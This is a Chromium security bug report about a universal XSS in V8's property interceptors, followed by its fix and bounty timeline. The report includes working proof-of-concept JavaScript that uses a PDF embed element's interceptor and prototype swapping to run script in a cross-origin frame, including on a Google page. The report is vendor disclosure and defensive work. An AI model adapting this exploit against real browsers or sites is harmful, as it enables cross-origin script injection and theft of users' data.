# Universal XSS with global proxies, interceptors, and synchronous page loads

| Field | Value |
|-------|-------|
| **Issue ID** | [40084529](https://issues.chromium.org/issues/40084529) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>API |
| **Reporter** | se...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2016-06-10 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

v8::internal::Object::SetProperty iterates through the prototype chain to find an existing property  

with a given name. If nothing is found, the method defines a new data property on the receiver.  

The problem is that some named property interceptors have side-effects, and, unlike proxies, if an  

interceptor doesn't return a value, the execution of the method will continue.  

For example, the interceptor for HTMLEmbedElement can call a user-defined getter on Object.prototype:

src/third\_party/WebKit/Source/bindings/core/v8/custom/V8HTMLPlugInElementCustom.cpp:45:  

void getScriptableObjectProperty(PropertyType property, const v8::PropertyCallbackInfo[v8::Value](javascript:void(0);)& info)  

{  

HTMLPlugInElement\* impl = ElementType::toImpl(info.Holder());  

RefPtr<SharedPersistent[v8::Object](javascript:void(0);)> wrapper = impl->pluginWrapper();  

if (!wrapper)  

return;

```
v8::Local<v8::Object> instance = wrapper->newLocal(info.GetIsolate());  
if (instance.IsEmpty())  
    return;  

v8::Local<v8::Value> value;  
if (!instance->Get(info.GetIsolate()->GetCurrentContext(), property).ToLocal(&value))  
    return;  

if (value->IsUndefined() && !v8CallBoolean(instance->Has(info.GetIsolate()->GetCurrentContext(), property)))  
    return;  

v8SetReturnValue(info, value);  

```

}

In order to exploit this bug, an attacker has to insert an object with a suitable property interceptor into  

the prototype chain of a global proxy and to force the interceptor to run JavaScript that performs  

a synchronous cross-origin page load into the window associated with the global proxy. As a result, a new  

property will be defined on a cross-origin global object.

**VERSION**  

Google Chrome 51.0.2704.84 (Official Build) m (64-bit)  

Google Chrome 53.0.2764.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**  

<http://localhost:8001/victim.html>:

<iframe name="child"></iframe>
<div id="log"/>
<script>
setInterval(() => {
var r;
try {
r = child.prop;
} catch (e) {
r = e;
}
log.textContent = "child.prop = " + r;
}, 100);
</script>

<http://localhost:8000/attacker.html>:

<body>
<script>
if (window == top) {
victim = document.body.appendChild(document.createElement("iframe"));
victim.width = victim.height = 1000;
victim.src = "http://localhost:8001/victim.html";
victim.onload = () => victim.contentWindow.child.location = location;
} else {
top.go();
}

function go() {  

embed = document.createElement("embed");  

embed.type ="application/pdf";  

document.body.appendChild(embed);  

Object.setPrototypeOf(embed, null);

```
wnd = victim.contentWindow.child;  
Object.setPrototypeOf(wnd, embed);  
Object.prototype.__defineGetter__("prop", () => {  
    anchor = wnd.document.createElement("a");  
    anchor.href = "about:blank";  
    anchor.click();  
});  
wnd.prop = 123;  

```

}  

</script>

</body>

A bit more complex real-world example:

<body>
<script>
embed = document.createElement("embed");
embed.type ="application/pdf";
document.body.appendChild(embed);
Object.setPrototypeOf(embed, null);

iframe = document.body.appendChild(document.createElement("iframe"));  

blob = new Blob([]);  

blobUrl = URL.createObjectURL(blob,"text/html");

intervalId = setInterval(() => {  

wnd = iframe.contentWindow[0];  

if (wnd) {  

clearInterval(intervalId);

```
    wnd.location = blobUrl;  
    intervalId = setInterval(() => {  
        if (wnd.document) {  
            clearInterval(intervalId);  

            Object.setPrototypeOf(wnd, embed);  
            Object.prototype.__defineGetter__("rpc", function() {  
                wnd.name = "gadgets";  

                anchor = wnd.document.createElement("a");  
                anchor.href = "about:blank";  
                anchor.click();  
            });  
            proxy = new Proxy({}, {get: x => function(arg) {  
                arg.constructor.constructor("alert(document.domain)")();  
            }});  
            iframe.contentWindow[0].rpc = proxy;  
        }  
    }, 0)  
}  

```

}, 0);  

iframe.src="<http://www.google.ru/chrome/business/>";  

</script>

</body>

--

I would like to remain anonymous for this report.

## Timeline

### np...@chromium.org (2016-06-13)

jww or mkwst -- Can you take a look?  I'm not sure how to assess.

### mk...@chromium.org (2016-06-14)

+jochen, haraken

I can reproduce the PoC's cross-origin code execution, but I'm not familiar enough with our implementation of proxies and interceptors to have a good suggestion for a solution. Do either of you have suggestions?

Setting flags accordingly.

### jo...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### jo...@chromium.org (2016-06-14)

in the end, it shouldn't be possible to modify the prototype chain of a global object.

We could also redo the access check after invoking an interceptor on an access checked object.

Anyways, fixing the plugin interceptor for now

### es...@chromium.org (2016-06-14)

Setting labels for security bug queue, please adjust if necessary.

[Monorail components: Blink>JavaScript>API]

### bu...@chromium.org (2016-06-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/2c8ca9ad09281d4138ae363566051e45afd0838c

commit 2c8ca9ad09281d4138ae363566051e45afd0838c
Author: jochen <jochen@chromium.org>
Date: Tue Jun 21 18:07:54 2016

Make sure api interceptors don't change the store target w/o storing

BUG=chromium:619166
R=verwaest@chromium.org

Review-Url: https://codereview.chromium.org/2082633002
Cr-Commit-Position: refs/heads/master@{#37152}

[modify] https://crrev.com/2c8ca9ad09281d4138ae363566051e45afd0838c/src/objects.cc


### bu...@chromium.org (2016-06-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c7715c2fbee025f69acc539f8620b7d423d5c3e8

commit c7715c2fbee025f69acc539f8620b7d423d5c3e8
Author: jochen <jochen@chromium.org>
Date: Wed Jun 22 10:18:42 2016

Add HasOwnProperty with array indexes

This way embedders don't have to manually convert them to strings

BUG=chromium:619166
R=verwaest@chromium.org

Review-Url: https://codereview.chromium.org/2085223002
Cr-Commit-Position: refs/heads/master@{#37179}

[modify] https://crrev.com/c7715c2fbee025f69acc539f8620b7d423d5c3e8/include/v8.h
[modify] https://crrev.com/c7715c2fbee025f69acc539f8620b7d423d5c3e8/src/api.cc
[modify] https://crrev.com/c7715c2fbee025f69acc539f8620b7d423d5c3e8/src/objects-inl.h
[modify] https://crrev.com/c7715c2fbee025f69acc539f8620b7d423d5c3e8/src/objects.h
[modify] https://crrev.com/c7715c2fbee025f69acc539f8620b7d423d5c3e8/test/cctest/test-api.cc


### bu...@chromium.org (2016-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/dbbdebecc3416092a833f8ac14a849500be8a2eb

commit dbbdebecc3416092a833f8ac14a849500be8a2eb
Author: jochen <jochen@chromium.org>
Date: Thu Jun 23 11:21:13 2016

Only access a plugin's scriptable object, and not also its prototype chain

BUG=chromium:619166
R=haraken@chromium.org

Review-Url: https://codereview.chromium.org/2084183004
Cr-Commit-Position: refs/heads/master@{#401579}

[modify] https://crrev.com/dbbdebecc3416092a833f8ac14a849500be8a2eb/third_party/WebKit/Source/bindings/core/v8/custom/V8HTMLPlugInElementCustom.cpp


### jo...@chromium.org (2016-06-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-23)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Request-XX label, where XX is the Chrome milestone.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### sh...@chromium.org (2016-06-25)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-06-27)

Before we approve merge to M52, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

### jo...@chromium.org (2016-06-27)

i haven't observed any regressions so far, and the change is on canary

### go...@chromium.org (2016-06-27)

Multiple CLs listed at https://crbug.com/chromium/619166#c6, #7 and #8. All of them needs to be merged to M52? 

Reply by jochen@ in chat,
the first v8 CL adds a security check that will make chrome crash if somebody tries the exploit
the second v8 CL adds a slightly modified v8 api
which the third (and first blink) cl uses to avoid this particular security bug reported 
so in theory we could go with the first cl only but a really nice fix would be all three.

Approving merge to M52 branch 2743 for all 3 CLs. Please merge ASAP. Thank you.


### bu...@chromium.org (2016-06-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/72657cda42e7055755c4cacceeafd34626440d26

commit 72657cda42e7055755c4cacceeafd34626440d26
Author: Jochen Eisinger <jochen@chromium.org>
Date: Tue Jun 28 07:27:18 2016

Version 5.2.361.26 (cherry-pick)

Merged 2c8ca9ad09281d4138ae363566051e45afd0838c

Make sure api interceptors don't change the store target w/o storing

BUG=chromium:619166
LOG=N
TBR=verwaest@chromium.org

Review URL: https://codereview.chromium.org/2101983002 .

Cr-Commit-Position: refs/branch-heads/5.2@{#32}
Cr-Branched-From: 2cd36d6d0439ddfbe84cd90e112dced85084ec95-refs/heads/5.2.361@{#1}
Cr-Branched-From: 3fef34e02388e07d46067c516320f1ff12304c8e-refs/heads/master@{#36332}

[modify] https://crrev.com/72657cda42e7055755c4cacceeafd34626440d26/include/v8-version.h
[modify] https://crrev.com/72657cda42e7055755c4cacceeafd34626440d26/src/objects.cc


### bu...@chromium.org (2016-06-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/2d5b92ffeed1d90be924e3f7d0b863156e504c6c

commit 2d5b92ffeed1d90be924e3f7d0b863156e504c6c
Author: Jochen Eisinger <jochen@chromium.org>
Date: Tue Jun 28 07:58:16 2016

Version 5.2.361.27 (cherry-pick)

Merged c7715c2fbee025f69acc539f8620b7d423d5c3e8

Add HasOwnProperty with array indexes

BUG=chromium:619166
LOG=N
TBR=verwaest@chromium.org

Review URL: https://codereview.chromium.org/2103033002 .

Cr-Commit-Position: refs/branch-heads/5.2@{#33}
Cr-Branched-From: 2cd36d6d0439ddfbe84cd90e112dced85084ec95-refs/heads/5.2.361@{#1}
Cr-Branched-From: 3fef34e02388e07d46067c516320f1ff12304c8e-refs/heads/master@{#36332}

[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/include/v8-version.h
[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/include/v8.h
[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/src/api.cc
[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/src/objects-inl.h
[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/src/objects.h
[modify] https://crrev.com/2d5b92ffeed1d90be924e3f7d0b863156e504c6c/test/cctest/test-api.cc


### bu...@chromium.org (2016-06-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/a656a52ae406c76939cb9625e22aaa3672096d96

commit a656a52ae406c76939cb9625e22aaa3672096d96
Author: Jochen Eisinger <jochen@chromium.org>
Date: Tue Jun 28 08:11:46 2016

Only access a plugin's scriptable object, and not also its prototype chain

BUG=chromium:619166
R=haraken@chromium.org

Review-Url: https://codereview.chromium.org/2084183004
Cr-Commit-Position: refs/heads/master@{#401579}
(cherry picked from commit dbbdebecc3416092a833f8ac14a849500be8a2eb)

Review URL: https://codereview.chromium.org/2107713002 .

Cr-Commit-Position: refs/branch-heads/2743@{#502}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/a656a52ae406c76939cb9625e22aaa3672096d96/third_party/WebKit/Source/bindings/core/v8/custom/V8HTMLPlugInElementCustom.cpp


### ha...@chromium.org (2016-07-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### oc...@chromium.org (2016-07-20)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-25)

Nice one Sergey, $7,500 for this one.

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/0d4394e483726d43c3eb5a77469cb0cb82d983d6

commit 0d4394e483726d43c3eb5a77469cb0cb82d983d6
Author: ishell@chromium.org <ishell@chromium.org>
Date: Thu Jul 28 09:34:46 2016

Merged: [ic] Don't call LookupIterator::GetStoreTarget() when receiver is not a JSReceiver.

Revision: 5c8cb1689a543955cd1a47d3c323f8710b8b0f15

BUG=chromium:619166,chromium:625155
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=jochen@chromium.org

Review URL: https://codereview.chromium.org/2192793002 .

Cr-Commit-Position: refs/branch-heads/5.3@{#27}
Cr-Branched-From: 820a23aade5e74a92d794e05a0c2b3597f0da4b5-refs/heads/5.3.332@{#2}
Cr-Branched-From: 37538cb2c1b4d75c41af386cb4fedbe5566f5608-refs/heads/master@{#37308}

[modify] https://crrev.com/0d4394e483726d43c3eb5a77469cb0cb82d983d6/src/lookup.h
[modify] https://crrev.com/0d4394e483726d43c3eb5a77469cb0cb82d983d6/src/objects.cc
[modify] https://crrev.com/0d4394e483726d43c3eb5a77469cb0cb82d983d6/test/cctest/test-api-interceptors.cc


### bu...@chromium.org (2016-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/dd08fa860281ab9b29c7716b9a6786401caa283b

commit dd08fa860281ab9b29c7716b9a6786401caa283b
Author: ishell@chromium.org <ishell@chromium.org>
Date: Thu Jul 28 10:01:39 2016

Merged: [ic] Don't call LookupIterator::GetStoreTarget() when receiver is not a JSReceiver.

Revision: 5c8cb1689a543955cd1a47d3c323f8710b8b0f15

BUG=chromium:619166,chromium:625155
LOG=N
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=jochen@chromium.org

Review URL: https://codereview.chromium.org/2192683004 .

Cr-Commit-Position: refs/branch-heads/5.2@{#60}
Cr-Branched-From: 2cd36d6d0439ddfbe84cd90e112dced85084ec95-refs/heads/5.2.361@{#1}
Cr-Branched-From: 3fef34e02388e07d46067c516320f1ff12304c8e-refs/heads/master@{#36332}

[modify] https://crrev.com/dd08fa860281ab9b29c7716b9a6786401caa283b/src/lookup.h
[modify] https://crrev.com/dd08fa860281ab9b29c7716b9a6786401caa283b/src/objects.cc
[modify] https://crrev.com/dd08fa860281ab9b29c7716b9a6786401caa283b/test/cctest/test-api-interceptors.cc


### aw...@chromium.org (2016-08-04)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-08-18)

[Empty comment from Monorail migration]

### of...@google.com (2016-10-18)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/619166?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084529)*
